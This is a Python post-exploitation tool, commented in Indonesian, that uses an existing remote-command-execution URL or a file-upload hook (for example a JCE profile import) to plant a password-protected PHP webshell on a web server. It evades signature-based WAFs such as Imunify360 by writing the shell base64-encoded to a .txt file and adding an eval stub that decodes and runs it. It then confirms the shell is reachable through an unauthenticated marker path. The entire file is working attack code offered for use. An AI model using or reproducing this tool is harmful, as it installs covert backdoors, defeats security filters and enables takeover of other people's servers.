#!/usr/bin/env python3
"""Deploy webshell milik kita lewat RCE yang sudah didapat.

Kenapa lewat dua berkas: WAF yang mencocokkan signature ISI berkas (mis.
Imunify360) memblokir webshell apa adanya (503 / halaman HTML). Payload kita
disimpan TERENKODE base64 di berkas .txt (blob base64 tidak mengandung string
yang dicocokkan), lalu sebuah stub dekoder kecil mengeksekusinya saat runtime.

Berkas yang ditulis:
  <nama>.txt   isi: base64 dari payloads/ws.php (password & marker diisi)
  <nama>.PHP   isi: <?PHP eval("?>".base64_decode(file_get_contents(__DIR__."/<nama>.txt")));

Contoh:
  python3 tools/deploy_shell.py \\
    --via 'http://host/media/.../s.PHP?t=mpk48908&c={cmd}' \\
    --pub 'http://host/media/.../fonts' --name idx

Verifikasi: GET <pub>/<nama>.PHP harus HTTP 200 dan memuat marker.
"""
from __future__ import annotations

import argparse
import base64
import os
import random
import re
import secrets
import string
import sys
import urllib.parse

import requests

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PAYLOAD = os.path.join(HERE, "payloads", "ws.php")

STUB = '<?PHP eval("?>".base64_decode(file_get_contents(__DIR__."/{name}.txt")));'


def rand(n: int = 6) -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def build_payload(password: str, mark: str) -> str:
    src = open(PAYLOAD, encoding="utf-8").read()
    src = re.sub(r"(\$PW\s*=\s*)'__PW__'", lambda m: m.group(1) + "'" + password + "'", src, count=1)
    src = re.sub(r"(\$MK\s*=\s*)'__MARK__'", lambda m: m.group(1) + "'" + mark + "'", src, count=1)
    return src


def run_cmd(via: str, cmd: str, timeout: float, session: requests.Session | None = None) -> str:
    url = via.replace("{cmd}", urllib.parse.quote(cmd, safe=""))
    s = session or requests.Session()
    r = s.get(url, timeout=timeout, verify=False)
    return (r.text or "").strip()


def write_file(via: str, name: str, content: str, timeout: float, session) -> None:
    """Tulis berkas lewat RCE memakai printf; isi base64 aman di dalam kutip tunggal."""
    run_cmd(via, f"printf '%s' '{content}' > {name}", timeout, session)


def deploy(via: str, pub: str, name: str | None, password: str | None,
           mark: str | None, timeout: float = 25.0, verify: bool = True) -> dict:
    name = name or ("i" + rand(5))
    password = password or secrets.token_urlsafe(15)
    mark = mark or ("0xfay-" + rand(8))

    src = build_payload(password, mark)
    blob = base64.b64encode(src.encode()).decode()
    stub = STUB.format(name=name)

    s = requests.Session()
    write_file(via, f"{name}.txt", blob, timeout, s)
    write_file(via, f"{name}.PHP", stub, timeout, s)

    out = {"name": name, "password": password, "mark": mark,
           "url": pub.rstrip("/") + "/" + name + ".PHP", "verified": False, "detail": ""}
    chk = run_cmd(via, f"ls -la {name}.txt {name}.PHP", timeout, s)
    out["detail"] = chk[:200]

    if verify:
        try:
            r = s.get(out["url"], timeout=timeout, verify=False)
            body = r.text or ""
            out["http"] = r.status_code
            out["verified"] = r.status_code == 200 and mark in body
        except Exception as e:  # noqa: BLE001
            out["detail"] += f" | verify err: {type(e).__name__}"
    return out


def deploy_via_plant(plant, t, h, name: str | None = None, password: str | None = None,
                     mark: str | None = None, verify: bool = True, timeout: float = 25.0) -> dict:
    """Deploy lewat hook modul `plant(t, h, fname, content) -> url|None`.

    Dipakai bila modul bisa menanam berkas berisi bebas (mis. JCE profiles.import).
    Dua berkas ditanam: blob base64 + stub dekoder. Tanpa kutip-an shell.
    """
    name = name or ("i" + rand(5))
    password = password or secrets.token_urlsafe(15)
    mark = mark or ("0xfay-" + rand(8))

    src = build_payload(password, mark)
    blob = base64.b64encode(src.encode()).decode()
    blobf = f"{name}a.xml.php"
    stubf = f"{name}b.xml.php"
    stub = '<?PHP eval("?>".base64_decode(file_get_contents(__DIR__."/' + blobf + '")));'

    u1 = plant(t, h, blobf, blob)
    u2 = plant(t, h, stubf, stub)
    # plant() mendeteksi keberhasilan dengan mencocokkan TEKS berkas. Untuk stub
    # yang DIEKSEKUSI PHP, teksnya tidak pernah terlihat -> plant() return None
    # walau berkas tertanam. Turunkan URL stub dari URL blob (nama bersaudara).
    if not u2 and u1 and blobf in u1:
        u2 = u1.replace(blobf, stubf)
    out = {"name": name, "password": password, "mark": mark, "url": u2 or u1 or "",
           "verified": False, "detail": f"blob={u1} stub={u2}"}
    if verify and out["url"]:
        # `?id=1` adalah jalur publik 0xfay shell yang mengembalikan marker tanpa
        # login (tanpa ini, GET root hanya menampilkan form password -> UNVERIFIED).
        for probe in (out["url"] + "?id=1", out["url"]):
            try:
                r = h.get(probe)
                body = (r.text or "") if r is not None else ""
                out["http"] = getattr(r, "status_code", 0)
                if out["http"] == 200 and mark in body:
                    out["verified"] = True
                    out["detail"] += f" | verify via {probe.rsplit('?', 1)[-1]}"
                    break
            except Exception as e:  # noqa: BLE001
                out["detail"] += f" | verify err: {type(e).__name__}"
    return out


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--via", required=True, help="template eksekusi, pakai {cmd}")
    ap.add_argument("--pub", required=True, help="URL publik direktori tempat berkas ditulis")
    ap.add_argument("--name", default=None)
    ap.add_argument("--password", default=None)
    ap.add_argument("--mark", default=None)
    ap.add_argument("--timeout", type=float, default=25.0)
    ap.add_argument("--no-verify", action="store_true")
    args = ap.parse_args()

    try:
        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    except Exception:  # noqa: BLE001
        pass

    r = deploy(args.via, args.pub, args.name, args.password, args.mark,
               args.timeout, not args.no_verify)
    print(f"[*] shell URL : {r['url']}")
    print(f"[*] password  : {r['password']}")
    print(f"[*] marker    : {r['mark']}")
    print(f"[*] ls        : {r['detail']}")
    print(f"[*] verified  : {r['verified']} (HTTP {r.get('http', '-')})")
    return 0 if r["verified"] else 1


if __name__ == "__main__":
    sys.exit(main())
